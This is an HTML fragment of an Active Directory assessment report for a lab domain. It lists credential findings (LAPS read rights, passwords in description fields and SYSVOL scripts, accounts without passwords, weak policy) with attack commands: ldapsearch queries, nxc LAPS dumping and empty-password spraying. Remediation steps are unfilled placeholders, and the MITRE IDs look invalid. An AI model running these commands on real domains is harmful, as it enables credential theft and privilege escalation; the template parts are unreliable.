                                                    <p>1. Each user in Active Directory has a lastlogon attribute which can be used to identify stale and unused accounts.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/inactive.png" alt="Inactive accounts">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>JML process to disable inactive accounts</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr></tbody></table></div>


                <div class="finding-header">Passwords</div>
                <div class="finding-container">
                <table>
                    <thead>
                        <tr>
                            <th class="table-header">Issue</th>
                            <th class="table-header">Risk</th>
                        </tr>
                    </thead>
                    <tbody>                <tr>
                            <td class="toggle" id="Plaintext-credentials-found-in-a-standard-user's-Active-Directory-description-field"><u>Plaintext credentials found in a standard user's Active Directory description field</u></td>
                            <td class="finding-riskCRITICAL">CRITICAL</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>Active Directory description fields are readable by any low-privileged user in the domain.</td>
                                                <td>T-15940</td>
                                                <td>+50</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>                                <tr><td class="grey">User</td><td>jack</td></tr>
                                        <tr><td class="grey">Description</td><td>m&skd03(*#o</td></tr>                                        </table></td>
                                                <td class="explanation">
                                                    <p>Whilst storing passwords within description fields in AD may seem convenient, however it should be noted that by default any authenticated user can read the description for any domain user, so storing passwords here effectively shares the password with everyone in the network.</p>
                                                    <p>Privileged users have passwords in their Active Directory description field. These attributes are readable by any authenticated user so these priviliged account should be assumed compromised .</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://hackdefense.com/publications/wachtwoorden-in-het-omschrijvingen-veld/">Link 1</a></p>
                                                    <p><a href="https://medium.com/beyond-the-helpdesk/easily-configure-confidential-attributes-in-active-directory-769bd2b9d12c">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. Any low-privileged user can read all active directory descripion fields to find sensitive information like passwords.</p>
                                                            <p class="code">ldapsearch -H ldap://dc.test.local -x -b "DC=test,DC=local" -D 'test' -w 'Password123!' "(&(objectClass=user)(samaccountname=jack))"</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Passwords/Userdescription.png" alt="Reading AD description field">
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Remove sensitive info from AD description field, confidential attributes can be used in the schema alternatively</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>    <tr>
                <td class="toggle" id="Low-privileged-principal-can-read-LAPS-password-on-domain-controllers"><u>Low privileged principal can read LAPS password on domain controllers</u></td>
                <td class="finding-riskCRITICAL">CRITICAL</td>
            </tr>
            <tr class="finding">
                <td colspan="3">
                    <div class="finding-info">
                        <table>
                            <tbody>
                                <tr>
                                    <th>Issue</th>
                                    <th>MITRE ATT&CK ref</th>
                                    <th>Score</th>
                                </tr>
                                <tr><td>A low-privileged user can escalate to local admin priviliges by readint the LAPS password.</td>                            <td>T-15940</td>
                                    <td>+50</td>
                                </tr>
                            </tbody>
                        </table>
                        <table>
                            <tbody>
                                <tr>
                                    <th>Relevant info</th>
                                    <th>Issue explanation</th>
                                </tr>
                                <tr>
                                    <td class="relevantinfo"><table>                    <tr><td class="grey">IdentityReference</td><td>NT AUTHORITY\Authenticated Users
        TEST\Domain Users</td></tr>
                            <tr><td class="grey">LAPS computers</td><td>OU=Domain Controllers,DC=test,DC=local</td></tr>                            </table></td>
                                    <td class="explanation">
                                        <p>The Local Administrator Password Solution (LAPS) is Microsoft’s solution for managing the credentials of a local administrator account on every machine, either the default RID 500 or a custom account. It ensures that the password for each account is different, random, and automatically changed on a defined schedule (default – 30 days). It periodically changes the local administrator's password when it expires. Permission to request and reset the credentials can be delegated, which is also auditable.
                                        Installing LAPS requires an update to the schema, where the ms-Mcs-AdmPwd and ms-Mcs-AdmPwdExpirationTime attributes will be added containing the respective LAPS account password and expiration time for accounts. Only groups with delegated permission can read the LAPS password, e.g. Domain Admins, which is random and different across every local admin. Reading the password and then logging into systems via the LAPS local admin accounts also prevents the need to log into systems with other privileged accounts, e.g. domain admins, and avoids caching these credentials in memory on the system, further reducing the attack surface.</p>
                                        <p>NT AUTHORITY\Authenticated Users has read LAPS password rights on OU=Domain Controllers,DC=test,DC=local meaning low privileged users are domain admins
        TEST\Domain Users has read LAPS password rights on OU=Domain Controllers,DC=test,DC=local meaning low privileged users are domain admins.</p>
                                        <p class="links"><b>Further information:</b></p>
                                        <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview">Link 1</a></p>
                                        <p><a href="https://www.hackingarticles.in/credential-dumpinglaps/">Link 2</a></p>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                                            <table>
                            <tbody>
                                <tr>
                                    <th>Attack explanation</th>
                                </tr>
                                <tr>
                                    <td>
                                        <div class="attack-container">
                                            <div class="attack-text">
                                                <p>1. Any low-privileged user can remotely enumerate systems that users can read the LAPS password for using bloodhound.</p>
                                            </div>
                                            <span class="image-cell">
                                                <img src="/Private/Report/Images/Passwords/LAPS-1.png" alt="Finding systems where can read the LAPS password">
                                            </span>
                                        </div>
                                        <hr>
                                        <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. An adversary can then simply read the plaintext LAPS password from the target computers ms-Mcs-AdmPwd property from Active Directory, and escalate their privileges to local admins.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' -M laps</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Passwords/LAPS-2.png" alt="Reading the LAPS password">
                                        </span>
                                    </div>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                        <table>
                            <tbody>
                                <tr>
                                    <th>Remediation (GPT to contextualize)</th>
                                </tr>
                                <tr>
                                    <td>
                                        <p>Delegate who can read LAPS password to administrators only</p>
                                        <p>run command 1</p>
                                        <p>run command 2</p>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </td>
            </tr>                <tr>
                            <td class="toggle" id="Highly-privileged-user-does-not-require-a-password"><u>Highly privileged user does not require a password</u></td>
                            <td class="finding-riskCRITICAL">CRITICAL</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>User account may have a blank password set (PASSWD_NOTREQD).</td>
                                                <td>T-15940</td>
                                                <td>+40</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                <tr><td class="grey">Users</td><td>jack<br>enterpriseadmin1</td></tr>                    <tr><td class="grey">MemberOf</td><td>CN=Domain Admins,CN=Users,DC=test,DC=local CN=Enterprise Admins,CN=Users,DC=test,DC=local CN=Schema Admins,CN=Users,DC=test,DC=local<br>CN=Enterprise Admins,CN=Users,DC=test,DC=local</td></tr>                    <tr><td class="grey">PASSWD_NOTREQD</td><td>True</td></tr>
                            <tr><td class="grey">Enabled</td><td>True</td></tr>
                                                </table></td>
                                                <td class="explanation">
                                                    <p>Users with the PASSWD_NOTREQD attribute set in Active Directory may have a blank password set This means simply knowing the account username will be enough to login and authenticte as that user, providing an attacker unauthenticatd access to the domain.</p>
                                                    <p>2 users do not require a password and are a member of a privileged group</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://specopssoft.com/blog/find-ad-accounts-using-password-not-required-blank-password/">Link 1</a></p>
                                                    <p><a href="https://activedirectorypro.com/find-accounts-with-password-not-required-blank-password/">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. An unauthenticated attacker can spray empty passwords against users in the hopes that some have blank passwords set. This allows an unauthorised attacker access to the same domain resources as an authenticated user, giivng a foothold to escalate within the domain.</p>
                                                            <p class="code">nxc smb dc.test.local -u emptypasswd -p '' --shares</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Passwords/pwdnotrequired.png" alt="Finding users without a password required">
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Remove PASSWD_NOTREQD attribute from all users</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>    <tr>
                <td class="toggle" id="Low-privileged-principal-can-read-LAPS-password-on-domain-computers"><u>Low privileged principal can read LAPS password on domain computers</u></td>
                <td class="finding-riskCRITICAL">CRITICAL</td>
            </tr>
            <tr class="finding">
                <td colspan="3">
                    <div class="finding-info">
                        <table>
                            <tbody>
                                <tr>
                                    <th>Issue</th>
                                    <th>MITRE ATT&CK ref</th>
                                    <th>Score</th>
                                </tr>
                                <tr><td>A low-privileged user can escalate to local admin priviliges by readint the LAPS password.</td>                            <td>T-15940</td>
                                    <td>+35</td>
                                </tr>
                            </tbody>
                        </table>
                        <table>
                            <tbody>
                                <tr>
                                    <th>Relevant info</th>
                                    <th>Issue explanation</th>
                                </tr>
                                <tr>
                                    <td class="relevantinfo"><table>                    <tr><td class="grey">IdentityReference</td><td>TEST\Domain Users</td></tr>
                            <tr><td class="grey">LAPS computers</td><td>CN=Computers,DC=test,DC=local</td></tr>                            </table></td>
                                    <td class="explanation">
                                        <p>The Local Administrator Password Solution (LAPS) is Microsoft’s solution for managing the credentials of a local administrator account on every machine, either the default RID 500 or a custom account. It ensures that the password for each account is different, random, and automatically changed on a defined schedule (default – 30 days). It periodically changes the local administrator's password when it expires. Permission to request and reset the credentials can be delegated, which is also auditable.
                                        Installing LAPS requires an update to the schema, where the ms-Mcs-AdmPwd and ms-Mcs-AdmPwdExpirationTime attributes will be added containing the respective LAPS account password and expiration time for accounts. Only groups with delegated permission can read the LAPS password, e.g. Domain Admins, which is random and different across every local admin. Reading the password and then logging into systems via the LAPS local admin accounts also prevents the need to log into systems with other privileged accounts, e.g. domain admins, and avoids caching these credentials in memory on the system, further reducing the attack surface.</p>
                                        <p>TEST\Domain Users has read LAPS password rights on CN=Computers,DC=test,DC=local, meaning low privileged users are local admins.</p>
                                        <p class="links"><b>Further information:</b></p>
                                        <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview">Link 1</a></p>
                                        <p><a href="https://www.hackingarticles.in/credential-dumpinglaps/">Link 2</a></p>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                                            <table>
                            <tbody>
                                <tr>
                                    <th>Attack explanation</th>
                                </tr>
                                <tr>
                                    <td>
                                        <div class="attack-container">
                                            <div class="attack-text">
                                                <p>1. Any low-privileged user can remotely enumerate systems that users can read the LAPS password for using bloodhound.</p>
                                            </div>
                                            <span class="image-cell">
                                                <img src="/Private/Report/Images/Passwords/LAPS-1.png" alt="Finding systems where can read the LAPS password">
                                            </span>
                                        </div>
                                        <hr>
                                        <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. An adversary can then simply read the plaintext LAPS password from the target computers ms-Mcs-AdmPwd property from Active Directory, and escalate their privileges to local admins.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' -M laps</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Passwords/LAPS-2.png" alt="Reading the LAPS password">
                                        </span>
                                    </div>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                        <table>
                            <tbody>
                                <tr>
                                    <th>Remediation (GPT to contextualize)</th>
                                </tr>
                                <tr>
                                    <td>
                                        <p>Delegate who can read LAPS password to administrators only</p>
                                        <p>run command 1</p>
                                        <p>run command 2</p>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </td>
            </tr>                <tr>
                            <td class="toggle" id="Plaintext-credentials-found-in-a-standard-user's-Active-Directory-description-field"><u>Plaintext credentials found in a standard user's Active Directory description field</u></td>
                            <td class="finding-riskHIGH">HIGH</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>Active Directory description fields are readable by any low-privileged user in the domain.</td>
                                                <td>T-15940</td>
                                                <td>+30</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>                                <tr><td class="grey">User</td><td>DESKTOP-JKTS35O$<br>MILTON_BUCKLEY<br>MELISA_FOLEY<br>REBEKAH_WORKMAN<br>2229323318SA</td></tr>
                                        <tr><td class="grey">Description</td><td>password i=s 72783*&
        Just so I dont forget my password is 9q!3xTeHkgETd&xMm9np8F6mu
        Just so I dont forget my password is z&M!Z6Pf7L!YQRva8GyLHmiXM
        Just so I dont forget my password is 7KEqG4N9GyuNHENyH&b&8f5C2
        Just so I dont forget my password is JmrYyu9K#iB%WeNZ%PwykH</td></tr>                                        </table></td>
                                                <td class="explanation">
                                                    <p>Whilst storing passwords within description fields in AD may seem convenient, however it should be noted that by default any authenticated user can read the description for any domain user, so storing passwords here effectively shares the password with everyone in the network.</p>
                                                    <p>Standard users have passwords in their Active Directory description field. These attributes are readable by any authenticated user so these accounts should be assumed compromised .</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://hackdefense.com/publications/wachtwoorden-in-het-omschrijvingen-veld/">Link 1</a></p>
                                                    <p><a href="https://medium.com/beyond-the-helpdesk/easily-configure-confidential-attributes-in-active-directory-769bd2b9d12c">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. Any low-privileged user can read all active directory descripion fields to find sensitive information like passwords.</p>
                                                            <p class="code">ldapsearch -H ldap://dc.test.local -x -b "DC=test,DC=local" -D 'test' -w 'Password123!' "(&(objectClass=user)(samaccountname=jack))"</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Passwords/Userdescription.png" alt="Reading AD description field">
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Remove sensitive info from AD description field, confidential attributes can be used in the schema alternatively</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>                <tr>
                            <td class="toggle" id="Plaintext-credentials-found-readable-by-low-privileged-user"><u>Plaintext credentials found readable by low privileged user</u></td>
                            <td class="finding-riskHIGH">HIGH</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>Files within SYSVOL can be read by any low-privileged user.</td>
                                                <td>T-15940</td>
                                                <td>+30</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                    <tr><td class="grey">File</td><td>\\test.local\sysvol\test.local\scripts\secrets.config<br>\\test.local\sysvol\test.local\scripts\shares.cmd<br>\\test.local\sysvol\test.local\scripts\test.txt</td></tr>
                                                    <tr><td class="grey">Credential</td><td>password=Il0V3s3r3t5!<br>net use f:\\test\fileshare1\it /user:admin Summer2022!@<br>admin secret = asdasbmdbajsdas</td></tr>
                                                </table></td>
                                                <td class="explanation">
                                                    <p>Files within SYSVOL such as logon scripts often store hardcoded credentials used for things like mounting drives or running administrative tasks. What is not so well known is these files are readable and can be accessed by any low-privileged user.</p>
                                                    <p>Hardcoded plaintext credentials were found in SYSVOL. These can be used by any authenticated user and any account utilising them should be considered compromised.</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://www.sentinelone.com/blog/credentials-harvesting-from-domain-shares/">Link 1</a></p>
                                                    <p><a href="https://offsec.blog/hidden-menace-how-to-identify-misconfigured-and-dangerous-logon-scripts/">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. Low-privileged users can search for sensitive information like passwords in any file stored on SYSVOL which often finds passwords hardcoded in logon scripts.</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Passwords/Sensitiveinfo.png" alt="Finding sensitive infomation in SYSVOL">
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Remove hardcoded credentials from SYSVOL</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>                <tr>
                            <td class="toggle" id="Password-length-requirement-is-less-than-12-characters"><u>Password length requirement is less than 12 characters</u></td>
                            <td class="finding-riskHIGH">HIGH</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>Weak passwords are permitted by the password policy.</td>
                                                <td>T-15940</td>
                                                <td>+25</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                    <tr><td class="grey">Minimum password length</td><td>0</td></tr>
        
                                                </table></td>
                                                <td class="explanation">
                                                    <p>A weak domain password policy allow users to set weak passwords that can be easily guessed by attackers to compromise their accounts.</p>
                                                    <p>Passwords with lengths less than 14 characters can easily be bruteforced, and if hash is obtained, easily cracked. NCSC recommends 12 characters as a minimum length for a password.</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://www.netwrix.com/password-policy-best-practices.html">Link 1</a></p>
                                                    <p><a href="https://learn.microsoft.com/en-GB/entra/identity/authentication/concept-password-ban-bad-on-premises">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. Low-privileged users can enumerate the password policy for the domain. If the password length is short, attackers can passwordspray common weak passwords to gain access to user accounts.</p>
                                                            <p class="code">nxc smb dc.test.local -u test -p 'Password123!' --pass-pol</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Passwords/passwordpolicy.png" alt="Finding weak password policy">
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Improve the password policy</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>                <tr>
                            <td class="toggle" id="Password-complexity-requirement-is-not-enabled"><u>Password complexity requirement is not enabled</u></td>
                            <td class="finding-riskHIGH">HIGH</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>Weak passwords are permitted by the password policy.</td>
                                                <td>T-15940</td>
                                                <td>+20</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                    <tr><td class="grey">ComplexityEnabled</td><td>False</td></tr>
        
                                                </table></td>
                                                <td class="explanation">
                                                    <p>A weak domain password policy allow users to set weak passwords that can be easily guessed by attackers to compromise their accounts.</p>
                                                    <p>The password complexity requirement not being enforced allows passwords without a capital letter, number, special character or can contain the user's username.</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://www.netwrix.com/password-policy-best-practices.html">Link 1</a></p>
                                                    <p><a href="https://learn.microsoft.com/en-GB/entra/identity/authentication/concept-password-ban-bad-on-premises">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. Low-privileged users can enumerate the password policy for the domain. If complexity is not enforced, attackers can passwordspray common passwords to gain access to user accounts.</p>
                                                            <p class="code">nxc smb dc.test.local -u test -p 'Password123!' --pass-pol</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Passwords/passwordpolicy.png" alt="Finding weak password policy">
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Improve the password policy</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>                <tr>
                            <td class="toggle" id="Reversible-encryption-is-enabled"><u>Reversible encryption is enabled</u></td>
                            <td class="finding-riskHIGH">HIGH</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>Passwords are stored in memory in plaintext.</td>
                                                <td>T-15940</td>
                                                <td>+20</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                    <tr><td class="grey">Reverse encryption enabled</td><td>True</td></tr>
        
                                                </table></td>
                                                <td class="explanation">
                                                    <p>A weak domain password policy allow users to set weak passwords that can be easily found by attackers to compromise their accounts.</p>
                                                    <p>Passwords stored with reversible encryption is the same as storing them in plaintext, meaning an attacker extract them from memory in plaintext.</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://www.netwrix.com/password-policy-best-practices.html">Link 1</a></p>
                                                    <p><a href="https://learn.microsoft.com/en-GB/entra/identity/authentication/concept-password-ban-bad-on-premises">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. Low-privileged users can enumerate the password policy for the domain. If passwords are stored with reversible encryption they can be extracted from a computer's system memory by an attacker.</p>
                                                            <p class="code">nxc smb dc.test.local -u test -p 'Password123!' --pass-pol</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Passwords/passwordpolicy.png" alt="Finding weak password policy">
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Improve the password policy</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>                <tr>
                            <td class="toggle" id="Standard-user-does-not-require-a-password"><u>Standard user does not require a password</u></td>
                            <td class="finding-riskMEDIUM">MEDIUM</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>User account may have a blank password set (PASSWD_NOTREQD).</td>
                                                <td>T-15940</td>
                                                <td>+15</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                <tr><td class="grey">Users</td><td>Guest<br>test</td></tr>                    <tr><td class="grey">PASSWD_NOTREQD</td><td>True</td></tr>
                            <tr><td class="grey">Enabled</td><td>True</td></tr>
                                                </table></td>
                                                <td class="explanation">
                                                    <p>Users with the PASSWD_NOTREQD attribute set in Active Directory may have a blank password set This means simply knowing the account username will be enough to login and authenticte as that user, providing an attacker unauthenticatd access to the domain.</p>
                                                    <p>2 users do not require a password and are not a member of a privileged group</p>
                                                    <p class="links"><b>Further information:</b></p>
                                                    <p><a href="https://specopssoft.com/blog/find-ad-accounts-using-password-not-required-blank-password/">Link 1</a></p>
                                                    <p><a href="https://activedirectorypro.com/find-accounts-with-password-not-required-blank-password/">Link 2</a></p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Attack explanation</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <div class="attack-container">
                                                        <div class="attack-text">
                                                            <p>1. An unauthenticated attacker can spray empty passwords against users in the hopes that some have blank passwords set. This allows an unauthorised attacker access to the same domain resources as an authenticated user, giivng a foothold to escalate within the domain.</p>
                                                            <p class="code">nxc smb dc.test.local -u emptypasswd -p '' --shares</p>
                                                        </div>
                                                        <span class="image-cell">
                                                            <img src="/Private/Report/Images/Passwords/pwdnotrequired.png" alt="Finding users without a password required">
                                                        </span>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Remediation (GPT to contextualize)</th>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <p>Remove PASSWD_NOTREQD attribute from all users</p>
                                                    <p>run command 1</p>
                                                    <p>run command 2</p>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>                <tr>
                            <td class="toggle" id="The-password-history-count-is-less-than-24"><u>The password history count is less than 24</u></td>
                            <td class="finding-riskLOW">LOW</td>
                        </tr>
                        <tr class="finding">
                            <td colspan="3">
                                <div class="finding-info">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Issue</th>
                                                <th>MITRE ATT&CK ref</th>
                                                <th>Score</th>
                                            </tr>
                                            <tr>
                                                <td>Weak password policy permits user to set an old password.</td>
                                                <td>T-15940</td>
                                                <td>+9</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <th>Relevant info</th>
                                                <th>Issue explanation</th>
                                            </tr>
                                            <tr>
                                                <td class="relevantinfo"><table>
                                                    <tr><td class="grey">PasswordHistoryCount</td><td>10</td></tr>
        
                                                </table></td>
                                                <td class="explanation">
                                                    <p>A weak domain password policy allow users to set weak passwords that can be easily guessed by attackers to compromise their accounts.</p>
                                                    <p>Enforce password history setting prevents the easy reuse of old passwords, preventing users from changing their password to any of their last X number. This prevents password reuse.</p>
